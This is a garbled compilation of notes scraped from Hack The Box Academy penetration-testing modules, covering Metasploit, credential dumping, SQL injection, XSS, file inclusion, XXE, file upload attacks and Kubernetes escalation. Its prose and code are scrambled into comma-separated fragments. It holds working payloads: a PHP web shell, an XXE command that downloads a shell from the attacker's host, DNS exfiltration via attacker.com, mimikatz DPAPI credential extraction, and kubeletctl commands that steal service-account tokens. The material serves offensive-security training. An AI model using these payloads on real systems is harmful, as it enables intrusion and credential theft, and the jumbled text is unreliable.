=== Using the Metasploit Framework.md ===
# Current source: https://github.com/rapid7/metasploit-framework
  Code/Tools:  | This module provides methods for reporting data to the MSF DB. |

Looking at their purposes above, we conclude that we will not need the FileDropper method, and we can drop it from the final module code.

We see that there are different sections dedicated to the ,  | This method transfers files and handles file clean-up after a session with the target is established. |
| ,  page of the module, the ,  | This is a method for generating a first-stage php payload. |
| ,  | This module provides methods for acting as an HTTP client when exploiting an HTTP server. |
| ,  statements to see what each one does. This can be done by cross-referencing them with the [Metasploit documentation](https://docs.metasploit.com/api/). Below are their respective functions as explained in the documentation:


|**Function**|**Description**|
|-|-|
| , 

We can look at the 
# Current source: https://github.com/rapid7/metasploit-framework

=== Password Attacks.md ===
## DPAPI
  Code/Tools: C:\Users\Public> mimikatz.exe, Credential Manager, Remote Desktop Connection, shell
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
, machine and user keys, Google Chrome, > AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c, DPAPI, > Encrypted Key found in local state file, * using BCrypt with AES-256-GCM
#### DPAPI
  Code/Tools: shell
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
, == DPAPI [14ab89]==, key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b, 

Mimikatz and Pypykatz can extract the DPAPI , sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605, masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92, luid 1354633

=== Penetration Testing Process.md ===
#### 25. SQL Injection Fundamentals
  Code/Tools: SQL Injection Fundamentals
#### 27. Cross-Site Scripting (XSS)
  Code/Tools: Cross-site Scripting (XSS)
#### 28. File Inclusion
  Code/Tools: File Inclusion
#### 29. Command Injections
  Code/Tools: Command Injections

=== Attacking Common Applications.md ===
## Tomcat Manager - WAR File Upload
  Code/Tools: curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id,  on that directory from our web shell, we'll see the uploaded ,  application will be added to the table.


![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

If we click on ,  will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using , // by: Unknown,  application after, of course, noting down the file and upload location for our report, which in our example is , listening on [any] 4443 ..., .

![Tomcat deploy interface with fields for context path, version, XML config, and WAR file upload, showing 'backup.war' selected.](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

This file is uploaded to the manager GUI, after which the ,  error. We need to specify the , java
FileOutputStream(f);stream.write(m);o="Uploaded:

# Attacking Common Gateway Interface (CGI) Applications - Shellshock
  Code/Tools: /CGI-bin, CGI-bin
## Shellshock via CGI
  Code/Tools: $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable", not vulnerable, 

When the above variable is assigned, Bash will interpret the ,  if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user. Most of the time, this will be a user such as , , but when it is imported, it will execute the command , 

This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret ,  will be printed. 

,  as a function definition. But rather, function definitions within environment variables must now be prefixed with ,  user if the web server is running in an elevated context.

If the system is not vulnerable, only ,  portion as a function definition for a variable 
## SQL Injection
  Code/Tools: 

It then compares the newly created user password with the user-supplied password.

, java
<SNIP>
if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
<SNIP>
, 

Listing the content of the , this.username = username;, if (newUser.getPassword().equalsIgnoreCase(user.getPassword())), | admin    | welcome123  |, java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
, 

Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQL injection is still possible using , 

We can now rebuild the JAR file and attempt to log in using the payload , return newUser;
# Web Mass Assignment Vulnerabilities
  Code/Tools: attr_accessible :username, :email, User, { "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }, 

Although the , end,  model does not explicitly state that the , class User < ActiveRecord::Base, ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
,  attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Let's assume that the server receives the following parameters.

,  and 
## Exploiting Mass Assignment Vulnerability
  Code/Tools: if k:, return render_template('index.html',value='Success!!'), 

We can see that the application is checking if the value , with sqlite3.connect("database.db") as con:, cur = con.cursor(), session['user']=i,  page and set the parameters , python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
, Success!!, try:

=== SQLMap Essentials.md ===
## Supported SQL Injection Types
  Code/Tools: : Stacked queries
- ,  refers to the following:
- , --technique=TECH..  SQL injection techniques to use (default "BEUSTQ"), : Time-based blind
- , shell
sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
, Techniques:, 

The technique characters , : Error-based
- , : Boolean-based blind
- , sqlmap -hh
## Boolean-based blind SQL Injection
  Code/Tools:  or ,  from , 

SQLMap exploits ,  vulnerabilities through the differentiation of ,  query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned , Boolean-based blind SQL Injection,  results are based on responses having substantial differences from the regular server response.

- ,  results are generally based on responses having none or marginal difference to the regular server response.

- , . This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.  

- , SQL
AND 1=1

## Error-based SQL Injection
  Code/Tools: SQL
AND GTID_SUBSET(@@version,0)
,  (, 

If the , ) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers , Error-based SQL Injection
## Time-based blind SQL Injection
  Code/Tools: .  

- ,  is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. , SQL
AND 1=IF(2>1,SLEEP(5),0)
, Time-based blind SQL Injection,  or , ), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as ,  response should result in a response time indistinguishable from regular response times

, , ,  is considerably slower than the boolean-based blind SQLi, since queries resulting in , , but here the response time is used as the source for the differentiation between 
## Out-of-band SQL Injection
  Code/Tools: SQL
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
,  would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the , ), where , 

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. , Out-of-band SQL Injection, ), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. 
#### Parameter might be vulnerable to XSS attacks
  Code/Tools: Log Message:
#### UNION SQLi Tuning
  Code/Tools: --union-from, --union-cols, --union-cols=17, NULL, --union-char='a', FROM, FROM <table>, --union-from=users, UNION

=== File Transfers.md ===
#### File Upload using SCP
  Code/Tools: scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/, shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                                                                           100% 3414     6.7MB/s   00:00
, passwd                                                                                                           100% 3414     6.7MB/s   00:00, htb-student@10.129.86.90's password:

=== Command Injections.md ===
# Intro to Command Injections
## OS Command Injections
## Command Injection Detection
  Code/Tools: ping, 

If our input is not sanitized and escaped before it is used with the , bash
ping -c 1 OUR_INPUT
, 127.0.0.1, ping -c 1 OUR_INPUT, Host Checker
## Command Injection Methods
  Code/Tools: &, Windows, macOS, &&, \|, %7c, .Net, \n, regardless of the web application language, framework, or back-end server, %0a
# Command Injection Prevention

=== SQL Injection Fundamentals.md ===
## SQL Injection (SQLi)
  Code/Tools: ", '
# Intro to SQL Injections
## SQL Injection
  Code/Tools: php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
,  The web application will search for usernames similar to , , the search input would be:

, ), which will end the user-input field, and after it, we can write actual SQL code**. For example, if we search for , . In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input , , it becomes , select * from logins where username like '%1'; DROP TABLE users;', $searchInput =  $_POST['findUser'];, php
'%1'; DROP TABLE users;'
, $result = $conn->query($query);
## Types of SQL Injections
  Code/Tools: SQL, PHP, Union Based, Sleep(), Out-of-band, Error Based, Time Based, true, In-band, Boolean Based
## SQLi Discovery
  Code/Tools: ), sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
, SELECT * FROM logins WHERE username=''' AND password = 'something';, #, %29, Login Failed, %23, %27, %3B, "
## Writing Files through SQL Injection
  Code/Tools: 

![Search interface with a text box and button labeled 'Search'. Below is an empty table with columns: Port Code, Port City, and Port Volume](https://academy.hackthebox.com/storage/modules/33/write_proof.png)

We don’t see any errors on the page, which indicates that the query succeeded.  Checking for the file , cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -, sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
, select 'file written successfully!' into outfile '/var/www/html/proof.txt', 

<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0"><b>Note:</b> To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use <code>load_file</code> to read the server configuration, like Apache's configuration found at <code>/etc/apache2/apache2.conf</code>, Nginx's configuration at <code>/etc/nginx/nginx.conf</code>, or IIS configuration at <code>%WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code>, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">this wordlist for Linux</a> or <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this wordlist for Windows</a>. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.</p>
    </div>
</div>

The , /var/www/html/proof.txt, file written successfully!,  injection payload would be as follows:

, sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

# Mitigating SQL Injection

=== Cross-Site Scripting (XSS).md ===
## What is XSS
  Code/Tools: low impact + high probability = medium risk, reduce
## XSS Attacks
## Types of XSS
  Code/Tools: Reflected (Non-Persistent) XSS, DOM-based XSS, Stored (Persistent) XSS
# Stored XSS
  Code/Tools: Stored XSS, test, Persistent XSS, To-Do List
## XSS Testing Payloads
  Code/Tools: 

<div class="card bg-light">
    <div class="card-body">
        <p class="mb-0"><b>Tip:</b> Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p>
    </div>
</div>

As some modern browsers may block the , </ul></ul>, , and we should see our payload in the page source:

,  JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is , , which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is , html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
,  that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.

<!-- <div class="card bg-light">
    <div class="card-body">
        <p class="mb-0">Note: Modern browsers also have protections against XSS, and may prevent the payload from executing. We can use Firefox 'installed in PwnBox' for our testing. Furthermore, there are advanced techniques and advanced payloads to bypass the XSS protection, and should work on any browser.</p>
    </div>
</div> -->

To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a , 
We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:

![IP address 139.59.166.56:31323 with OK button.](images/module-103-002.jpg)

As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking at the page source by clicking [, ] or right-clicking and selecting , html
<script>alert(window.origin)</script>

# Reflected XSS
  Code/Tools: 

As we can see, the single quotes indeed contain our XSS payload , '',  

This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox ,  request in the , <div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>,  page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed ,  by clicking [, <script>, Non-Persistent, DOM-based XSS
# DOM XSS
  Code/Tools: Non-Persistent, DOM-based XSS, Network, test, reflected XSS, #, Add, To-Do List, CTRL+SHIFT+C, Document Object Model (DOM)
# XSS Discovery
#### XSS Payloads
  Code/Tools: <img>, <script>, HTML Attributes, CSS Style
## XSS Discovery
  Code/Tools: /phishing, Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page, dead image url
## Blind XSS Detection
  Code/Tools: how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?, alert, test, How can we know which specific field is vulnerable?, Blind XSS, How can we know what XSS payload to use?, /hijacking
# XSS Prevention
  Code/Tools: Sink, Source

=== File Inclusion.md ===
# Intro to File Inclusions
  Code/Tools: Java, PHP, Javascript
## Local File Inclusion (LFI)
  Code/Tools: navigation bar, /index.php?page=about, about, footer, about.php, header, index.php
# Local File Inclusion (LFI)
## Basic LFI
  Code/Tools: /etc/passwd, es.php, language, Spanish, es, C:\Windows\boot.ini, passwd
# Remote File Inclusion (RFI)
  Code/Tools: SSRF, Local File Inclusion (LFI)
## Local vs. Remote File Inclusion
  Code/Tools: https://, file_get_contents(), include, http://, @Html.RemotePartial(), ftp://, import, include(), include_once()
## Verify RFI
  Code/Tools: allow_url_include = On, 

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to , ) as our input string and see if it gets included:
![Shipping containers and cranes at a port with user and PHP error information displayed.](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

As we can see, the ,  to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (,  page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the , allow_url_include, echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include, shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
, , and see if we can get its content. At first, ,  and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port 
## Remote Code Execution with RFI
  Code/Tools: 

Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like , shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
,  or , echo '<?php system($_GET["cmd"]); ?>' > shell.php
# LFI and File Uploads
  Code/Tools: include, include_once(), require_once(), import, res.render(), image.jpg, include(), Execute, require()
## LFI wordlists
  Code/Tools: :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt, :: Method           : GET, ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287, ________________________________________________, :: Matcher          : Response status: 200,204,301,302,307,401,403, :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key, :: Follow redirects : false, ../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91], ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91], ...SNIP...
## LFI Tools
  Code/Tools: python2
# File Inclusion Prevention
## File Inclusion Prevention
  Code/Tools: case-match
## Preventing Directory Traversal
  Code/Tools:  sub-strings, so even if the resulting string contains , $input = str_replace('../', '', $input);, basename(), ., /etc/passwd, ?, php -a, echo file_get_contents('.?/.*/.?/etc/passwd');, php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
, while(substr_count($input, '../', 0)) {

=== Web Attacks.md ===
#### HTTP Verb Tampering
#### Insecure Direct Object References (IDOR)
#### XML External Entity (XXE) Injection
# Intro to HTTP Verb Tampering
  Code/Tools: GET, HTTP, verbs, POST, PUT, HEAD
## HTTP Verb Tampering
  Code/Tools: GET, DELETE, headers, POST, HTTP Verb Tampering, PATCH, PUT, OPTIONS, HEAD
# Verb Tampering Prevention
# Intro to IDOR
  Code/Tools: download.php?file_id=124, file_id, id, Insecure Direct Object References (IDOR), download.php?file_id=123, file_id=123
## What Makes an IDOR Vulnerability
  Code/Tools: weak access control system, an IDOR vulnerability mainly exists due to the lack of an access control on the back-end
## Impact of IDOR Vulnerabilities
  Code/Tools: IDOR Insecure Function Calls, IDOR Information Disclosure Vulnerabilities
# Identifying IDORs
## URL Parameters & APIs
  Code/Tools: ?filename=file_2.pdf, ?uid=2, ?uid=1, ?filename=file_1.pdf
# Mass IDOR Enumeration
# IDOR in Insecure APIs
  Code/Tools: IDOR Insecure Function Calls, IDOR Information Disclosure Vulnerabilities
## Identifying Insecure APIs
  Code/Tools: "uid": 1,, . The web application also appears to be setting the user access privileges (e.g. , DELETE,  request includes a few hidden parameters, like , , , , and most interestingly , Employee Manager, About Me, Email, "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
## Exploiting Insecure APIs
  Code/Tools: admin, Invalid role, Delete, /1, uuid mismatch, GET, Creating new employees is for admins only, full_name, Deleting employees is for admins only, /profile/api.php/profile/2
# Chaining IDOR Vulnerabilities
  Code/Tools: role=employee, GET
## Chaining Two IDOR Vulnerabilities
  Code/Tools: "full_name": "administrator",, "email": "webadmin@employees.htb",, , we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify. , . You may do so by retrieving their , "about": "A Release is like a boat. 80% of the holes plugged is not good enough.",  request to create a new user and see if we'd be allowed to do so:

![HTTP POST request to /profile/api.php with JSON data including 'uid', 'uuid', 'role', 'full name', 'email', and 'about' fields. Response: HTTP/1.1 200 OK](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)

We did not get an error message this time. If we send a , roles, ), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the ,  with an ,  has indeed been set to 
# IDOR Prevention
# Intro to XXE
  Code/Tools: XML External Entity (XXE) Injection
## Remote Code Execution with XXE
  Code/Tools: <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">, echo '<?php system($_REQUEST["cmd"]);?>' > shell.php,  command that downloads our web shell into the remote server:
, ]>, <email>&company;</email>, 

Now, we can use the following XML code to execute a , <message></message>, <name></name>, expect, <root>
## Other XXE Attacks
  Code/Tools: <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">, ]>, , references it in ,  multiple times, references , <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">, <message></message>, <name></name>, <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">, <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">, <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
## Error Based XXE
  Code/Tools: 

Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the , ]>, <!ENTITY % file SYSTEM "file:///etc/hosts">, <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">,  parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, ,  entity, as follows:
,  file as follows:
![HTTP POST request to /error/submitDetails.php with XML DOCTYPE for XXE attack, causing invalid URI error in PHP response.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. , <root>,  does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined , %remote;
# XXE Prevention

=== File Upload Attacks.md ===
# Intro to File Upload Attacks
  Code/Tools: High, Critical
## Types of File Upload Attacks
  Code/Tools: gaining remote command execution, Denial of Service (DoS), XSS, unauthenticated arbitrary file upload, XXE
## Arbitrary File Upload
  Code/Tools: Employee File Manager, All Files, .php
# Limited File Uploads
  Code/Tools: HTML, XML, SVG
## XSS
  Code/Tools: Comment                         :  "><img src=1 onerror=alert(window.origin)>, <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">, <script type="text/javascript">alert(window.origin);</script>,  parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to , exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg,  images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to , ...SNIP..., exiftool HTB.jpg, xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
, HTML
## XXE
  Code/Tools:  documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

While reading systems files like , 

Once the SVG image is displayed, we should get the base64 encoded content of , /etc/passwd, xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
, xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
, 

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (, , , <?xml version="1.0" encoding="UTF-8"?>, <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>, ) printed on the page or shown in the page source. Similarly, if the web application allows the upload of 
## Advanced File Upload Attacks
  Code/Tools: ffmpeg
# Preventing File Upload Vulnerabilities
# Skills Assessment - File Upload Attacks

=== Linux Privilege Escalation.md ===
# Escaping Restricted Shells
  Code/Tools: rbash
## Escaping
#### Command injection
  Code/Tools:  
,  command. Since the , shell
ls -l , ls -l, ls, ls -a,  command is not restricted by the shell, this would allow us to execute the , , followed by the output of the ,  command to be executed with the argument , pwd
## Kubernetes API
  Code/Tools: GET, DELETE, POST, PATCH, PUT
#### K8's API Server Interaction
  Code/Tools: "apiVersion": "v1",, "details": {},,  typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a , "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",, "kind": "Status",, shell
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
, 

, "reason": "Forbidden",, cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k, "code": 403
#### Kubelet API - Extracting Pods
  Code/Tools: 

The information displayed in the output includes the , "f:containers": {, , , cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq ., "metadata": {},, "manager": "kubectl-client-side-apply",, "kubernetes.io/config.source": "api", "f:image": {},,  and , "resourceVersion": "491",
#### Kubelet API - Available Commands
  Code/Tools: shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
, ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤, │ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │, ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤, │ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │, │                                   Node with pods vulnerable to RCE                                  │, ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐, cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce, │   │              │                                    │             │                         │ RUN │, │   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
#### Kubelet API - Executing Commands
  Code/Tools: cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx, uid=0(root) gid=0(root) groups=0(root), shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
, 

The output of the command shows that the current user executing the 
#### Kubelet API - Extracting Tokens
  Code/Tools: shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
, eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw, cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
#### Kubelet API - Extracting Certificates
  Code/Tools: cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt, -----BEGIN CERTIFICATE-----, 602eXnhZAL3+dA==, -----END CERTIFICATE-----, shell
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
, MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD, <SNIP>, MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p, 

Now that we have both the ,  and 

=== Attacking Common Services.md ===
#### CredentialFile
  Code/Tools: 

<div class="card bg-light">
    <div class="card-body">
				 <p class="mb-0">Note: We need to install <code>cifs-utils</code> to connect to an SMB share folder. To install it we can execute from the command line <code>sudo apt install cifs-utils</code>.</p>
    </div>
</div>


Once a shared folder is mounted, you can use common Linux tools such as ,  or , username=plaintext, password=Password123, txt
username=plaintext
password=Password123
domain=.
,  to interact with the file structure. Let's hunt for a filename that contains the string , domain=.
#### Directory Traversal
  Code/Tools: 2., Destination, 1., Privileges, 3., 4., ../../../../, Process, Source

=== Footprinting.md ===
#### Oracle RDBMS - File Upload
